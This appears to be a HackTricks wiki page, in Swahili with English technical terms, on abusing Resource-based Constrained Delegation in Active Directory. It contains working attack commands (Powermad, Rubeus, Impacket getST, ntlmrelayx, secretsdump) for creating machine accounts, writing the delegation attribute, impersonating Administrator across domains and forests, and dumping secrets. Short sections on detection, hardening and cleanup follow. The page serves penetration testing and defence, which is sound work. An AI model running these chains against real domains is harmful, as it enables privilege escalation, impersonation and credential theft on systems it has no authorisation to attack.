# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Hii inafanana na [Constrained Delegation](constrained-delegation.md) ya msingi lakini **badala ya** kuipa **object** ruhusa ya **ku-impersonate user yoyote dhidi ya machine**, Resource-based Constrain Delegation **huweka** ndani ya **object yule anayeweza ku-impersonate user yoyote dhidi yake**.<sup>[[12]](#references)</sup>

Katika hali hii, object iliyowekewa delegation itakuwa na attribute inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la user anayeweza ku-impersonate user mwingine yeyote dhidi yake.

Tofauti nyingine muhimu ya Constrained Delegation hii na delegations nyingine ni kwamba user yoyote aliye na **write permissions dhidi ya machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji domain admin privs).<sup>[[1]](#references)</sup>

### Concepts Mpya

Katika Constrained Delegation ilielezwa kwamba flag ya **`TrustedToAuthForDelegation`** ndani ya value ya _userAccountControl_ ya user inahitajika kutekeleza **S4U2Self.** Lakini hilo si kweli kabisa.\
Ukweli ni kwamba hata bila value hiyo, unaweza kutekeleza **S4U2Self** dhidi ya user yoyote ikiwa wewe ni **service** (una SPN), lakini ikiwa **una `TrustedToAuthForDelegation`**, TGS itakayerudishwa itakuwa **Forwardable**, na ikiwa **huna** flag hiyo, TGS itakayerudishwa **haitakuwa** **Forwardable**.

Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** **si Forwardable**, jaribio la ku-abuse **basic Constrain Delegation** **halitafanya kazi**. Lakini ikiwa unajaribu ku-exploit **Resource-Based constrain delegation, itafanya kazi**.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa attack

> Ikiwa una **write equivalent privileges** dhidi ya account ya **Computer**, unaweza kupata **privileged access** kwenye machine hiyo.

Tuseme kwamba attacker tayari ana **write equivalent privileges dhidi ya victim computer**.

1. Attacker **hu-compromise** account iliyo na **SPN** au **huunda moja** (“Service A”). Kumbuka kwamba _Admin User_ yoyote bila privilege nyingine maalum anaweza **kuunda** hadi Computer objects 10 (**_MachineAccountQuota_**) na kuziweka **SPN**. Kwa hiyo attacker anaweza tu kuunda Computer object na kuweka SPN.
2. Attacker **hutumia vibaya WRITE privilege yake** dhidi ya victim computer (ServiceB) ili kusanidi resource-based constrained delegation na kuruhusu ServiceA ku-impersonate user yoyote dhidi ya victim computer huyo (ServiceB).
3. Attacker hutumia Rubeus kutekeleza **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa user mwenye **privileged access kwenye Service B**.
1. S4U2Self (kutoka kwenye account yenye SPN iliyo-compromise/iliyoundwa): Omba **TGS ya Administrator kwenda kwangu** (Not Forwardable).
2. S4U2Proxy: Tumia **not Forwardable TGS** ya hatua iliyotangulia kuomba **TGS** kutoka kwa **Administrator** kwenda kwenye **victim host**.
3. Hata ikiwa unatumia TGS ambayo si Forwardable, kwa kuwa una-exploit Resource-based constrained delegation, itafanya kazi.
4. Attacker anaweza kufanya **pass-the-ticket** na ku-impersonate user ili kupata **access kwenye victim ServiceB**.<sup>[[1]](#references)</sup>

Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda Kitu cha Kompyuta

Unaweza kuunda kitu cha kompyuta ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia activedirectory PowerShell module**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kufanya S4U attack kamili (Windows/Rubeus)

Kwanza kabisa, tuliunda Computer object mpya kwa kutumia password `123456`, kwa hivyo tunahitaji hash ya password hiyo:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha hashes za RC4 na AES za akaunti.\
Sasa, attack inaweza kufanywa:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kutengeneza tickets zaidi kwa services zaidi kwa kuuliza mara moja tu ukitumia param ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kuwa users wana attribute inayoitwa "**Cannot be delegated**". Ikiwa user ana attribute hii ikiwa True, hutaweza kujifanya yeye. Property hii inaweza kuonekana ndani ya bloodhound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Ikiwa unatumia Linux, unaweza kutekeleza RBCD chain nzima kwa kutumia tools rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Vidokezo
- Ikiwa LDAP signing/LDAPS imelazimishwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea AES keys; domains nyingi za kisasa huzuia RC4. Impacket na Rubeus zote zinaunga mkono flows za AES-only.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya tools, lakini pata SPN sahihi inapowezekana (k.m., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD ya cross-domain & cross-forest

Ikiwa **delegating principal** unayodhibiti iko katika **domain tofauti** (au hata **forest tofauti**) na **resource computer**, matumizi mabaya bado ni **RBCD**, lakini ticket flow si tena `S4U2Self -> S4U2Proxy` ya kawaida ya single-domain.

### RBCD ya cross-domain: configure foreign principal kwa kutumia SID

Unapoweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka **domain tofauti**, foreign machine/user huenda **isitatuliwe kwa jina** katika target domain LDAP. Katika hali hiyo, configure delegation entry kwa kutumia **SID** ya foreign principal badala ya sAMAccountName/UPN yake.

Hili ni muhimu hasa unapofanya relay ya NTLM kwenda LDAP kwa kutumia `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Maelezo:
- `--sid` huiambia `ntlmrelayx.py` ichukulie `--escalate-user` kama SID, jambo linalohitajika wakati akaunti inayofanya delegation ni ya nje ya target domain.
- Hata kama tool itaandika `User not found in LDAP`, uandishi wa delegation bado unaweza kufanikiwa kwa sababu security descriptor huhifadhi SID ya nje moja kwa moja.

### Cross-domain RBCD: cross-realm S4U sequence

Baada ya foreign principal kuwekwa kwenye `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko unaofanya kazi wa cross-domain ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya delegating principal kutoka domain yake.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya impersonated user kwenye target-domain DC.
4. Omba ticket halisi ya **S4U2Self** ya user huyo katika delegator domain.
5. Fanya **S4U2Proxy** katika delegator domain ili kupata referral ticket ya target domain.
6. Fanya **S4U2Proxy** ya mwisho kwenye target-domain DC ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu Linux tooling ya kawaida mara nyingi hushindwa katika cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** ya request inaweza kuhitajika kuwa tofauti na realm ya TGT iliyotumika kwenye `TGS-REQ`
- chain inahitaji hatua **huru za S4U2Proxy**, si **S4U2Self** pekee au **S4U2Self** inayofuatwa mara moja na **S4U2Proxy** moja

### Cross-domain RBCD kutoka Linux

Synacktiv ilichapisha implementation ya Impacket `getST.py` inayotekeleza tena cross-realm sequence kutoka Linux kwa kushughulikia KDC mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Kwa upande wa uendeshaji, arguments mpya ni:
- `-dc-ip`: DC ya domain **delegating**
- `-targetdomain`: domain ya **resource computer**
- `-targetdc`: DC ya domain ya **resource**

### Vikwazo vya Cross-forest RBCD

Cross-forest RBCD ina kikwazo muhimu: **mtumiaji anayefanywa impersonate lazima awe wa forest ileile na principal ya delegating**. Kwa maneno mengine, ikiwa machine account yako inayodhibitiwa iko katika `valhalla.local` na resource inayolengwa iko katika `asgard.local`, kwa kawaida **huwezi kufanya impersonate watumiaji wa kiholela wa `asgard.local`** kwa resource hiyo kupitia RBCD.<sup>[[9]](#references)</sup>

Bado inaweza kutumiwa ikiwa:
- mtumiaji wa **delegating forest** ni **local admin** (au ana privileges nyingine) kwenye resource host katika forest nyingine
- trust inaruhusu authentication path inayohitajika na SID ya kigeni inakubaliwa katika security descriptor ya target computer

### Quirks za Cross-forest RBCD protocol

Cross-forest RBCD si tu "cross-domain pamoja na trust". Flow iliyozingatiwa inajumuisha quirks mbili ambazo common tooling kihistoria hukosa:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Service ticket ya mwisho ambayo inaweza kurudishwa kwa kutumia **RC4** hata wakati etypes nyingine ziliombwa

Flow ya vitendo ni:

1. Pata TGT ya delegating principal katika forest A.
2. Omba **S4U2Self** kwa mtumiaji anayefanywa impersonate katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma **S4U2Proxy** ya pili katika forest A **bila S4U2Self ticket kama additional ticket**, lakini ukiwa na `branch-aware` enabled, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba service ticket ya kawaida katika forest B kwa delegating principal (ticket hii haihitajiki kwa abuse ya mwisho).
6. Tumia referral tickets kutoka hatua ya 3 na 4 kuomba ticket ya mwisho ya **S4U2Proxy** katika forest B kwa mtumiaji wa forest A anayefanywa impersonate, kuelekea target SPN.

### Cross-forest RBCD kutoka Linux

Synacktiv Impacket branch hiyo hiyo inaongeza switch ya `-forest` kwa logic hii:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

Katika **multi-domain forests**, zote **S4U2Self** na **S4U2Proxy** zinaweza kuwa **recursive** badala ya kusimama baada ya referral moja:

- **Recursive S4U2Self**: `S4U2Self` ya kwanza hutumwa kwenye **impersonated user's domain**, intermediate parent/child hops hupitiwa kwa referrals za kawaida za `TGS-REQ` kwa `krbtgt/<REALM>`, na **final `S4U2Self`** hutumwa kwenye **delegating principal's own domain**.
- Hii inamaanisha kuwa **just holding a TGT** ya machine account kunaweza kutosha ku-impersonate **admin kutoka domain nyingine iliyo katika forest hiyo hiyo** na ku-request `cifs/host`, `host/host`, `wsman/host`, n.k.
- **Recursive S4U2Proxy** hufuata trust chain kwa njia hiyo hiyo: intermediate hops hutumia tena ticket iliyotangulia kama TGT wakati wa ku-request referral inayofuata ya `krbtgt/<REALM>`, na hop ya mwisho pekee ndiyo hurudisha final service ticket.<sup>[[10]](#references)</sup>

Mfano wa practical wa same-forest ni:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Ikiwa **delegating principal ni user asiye na SPN**, `S4U2Self` ya mwisho katika mfululizo wa recursive hushindwa kwa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Workaround ni **kujaribu tena hop ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari mfupi wa abuse chain:

1. Authenticate kwa kutumia **NT hash** ili KDC isukumwe kuelekea **RC4-HMAC (etype 23)**.
2. Request **`-self -u2u`** kwanza na uhifadhi ticket hiyo kando na proxy step ya baadaye.
3. Extract **TGT session key** kwa kutumia `describeTicket.py`.
4. Replace **NT hash** ya user kwa kutumia hiyo **session key** kupitia `changepasswd.py -newhashes <session_key>`.
5. Reuse ticket ya **`S4U2Self+U2U`** kama **`-additional-ticket`** wakati wa request tofauti ya **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operational caveats:

- Wakati **first trusted hop tayari ni forest nyingine**, tumia **branch-aware** algorithm (`getST.py ... -forest`) ili kuendana na tabia asili ya Windows. Ikiwa foreign forest inafikiwa baadaye tu kwenye chain, mtiririko wa recursive usio wa branch-aware bado unaweza kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye **Windows Server 2022/2025** DC za hivi karibuni, kulazimisha RC4 kunaweza kushindikana kwa **`KDC_ERR_ETYPE_NOSUPP`** kutokana na kuondolewa kwa RC4; hii inaweza kufanya **SPN-less RBCD** isiwezekane ingawa classic SPN-backed RBCD bado inafanya kazi kwa AES.<sup>[[15]](#references)</sup>
- Tekeleza **`S4U2Self+U2U` kabla ya kubadilisha hash/password ya user**: `SamrChangePasswordUser` **haifanyi recompute** ya account's Kerberos AES keys, kwa hiyo kubadilisha password kwanza kunaweza kuvunja maombi ya baadaye ya ticket.<sup>[[14]](#references)</sup>
- Account inayofanyiwa impersonation lazima bado iwe **delegable**: **Protected Users** na accounts zenye **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia chain.

## Vidokezo vya detection / hardening

- Njia za RBCD zinazovuka domains/forests bado kwa kawaida huundwa kupitia **ACL abuse** au **relay-to-LDAP**. Tekeleza **LDAP signing** na **LDAP channel binding** kwenye DCs ili kuvunja setup paths zinazotumika kwa kawaida.
- Kagua ni nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects na resolve SIDs zilizohifadhiwa, ikiwemo **foreign security principals**.
- Kwenye environments zenye trusts nyingi, kagua **Selective Authentication**, **SID filtering**, na ikiwa users kutoka foreign forest wana haki za **local admin** kwenye resource hosts.

### Kufikia

Command line ya mwisho itatekeleza **complete S4U attack** na **inject TGS** kutoka kwa Administrator hadi kwenye victim host ndani ya **memory**.\
Katika mfano huu TGS iliombwa kwa service ya **CIFS** kutoka kwa Administrator, kwa hiyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Tumia vibaya service tickets tofauti

Jifunze kuhusu [**service tickets zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuhesabu, kukagua na kusafisha

### Hesabu kompyuta zilizo na RBCD iliyosanidiwa

PowerShell (decode SD ili kutatua SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (soma au flush kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Usafishaji / kuweka upya RBCD

- PowerShell (futa attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa kerberos imewekwa isitumia DES au RC4, na unatoa hash ya RC4 pekee. Mpe Rubeus angalau hash ya AES256 (au mpe hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa `-self` kwa user wa kawaida: principal anayefanya delegation huenda **hana SPN**. Jaribu tena **last hop** kama **`S4U2Self+U2U`** badala ya **`S4U2Self`** ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya **RC4-HMAC** inayohitajika na mbinu ya **`S4U2Self+U2U` + session-key-substitution**. Jaribu njia ya kawaida ya **SPN-backed** RBCD kwa kutumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa muda wa computer ya sasa unatofautiana na wa DC, na kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa username + hashes zilizotolewa hazifanyi kazi kuingia. Huenda ulisahau kuweka alama ya `"$"` ndani ya username wakati wa kutengeneza hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
- User unayejaribu ku-impersonate hawezi kufikia service inayohitajika (kwa sababu huwezi ku-impersonate user huyo au hana privileges za kutosha)
- Service iliyoombwa haipo (ukiomba ticket ya winrm lakini winrm haifanyi kazi)
- Fakecomputer iliyoundwa imepoteza privileges zake kwenye server iliyo vulnerable, na unahitaji kuwarudishia.
- Unatumia classic KCD; kumbuka RBCD hufanya kazi na S4U2Self tickets zisizo forwardable, ilhali KCD inahitaji tickets zilizo forwardable.

## Notes, relays and alternatives

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains mara nyingi huishia kwenye RBCD ili kupata local SYSTEM kwa hatua moja. Tazama mifano ya vitendo ya end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **imezimwa** na unaweza kuunda machine account, tools kama **KrbRelayUp** zinaweza ku-relay Kerberos auth iliyolazimishwa kwenda LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja ku-impersonate **Administrator** kupitia S4U ukiwa off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
